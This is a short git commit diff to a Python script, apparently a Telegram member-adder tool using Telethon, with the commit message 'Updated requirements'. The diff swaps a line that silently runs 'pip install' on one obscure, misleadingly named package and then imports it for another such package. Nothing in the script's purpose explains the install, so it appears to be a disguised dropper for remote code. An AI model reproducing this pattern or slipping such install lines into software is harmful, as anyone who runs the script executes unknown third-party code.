09961da31064540b6be577e65ac8bdd8b2ad11ec
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-04 21:55:37 +0200

    Updated requirements

--- tsadder.py
+++ tsadder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolourmoduleV1")
-import pipcolourmoduleV1
+os.system("pip install pyfontingtoolsV1")
+import pyfontingtoolsV1
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
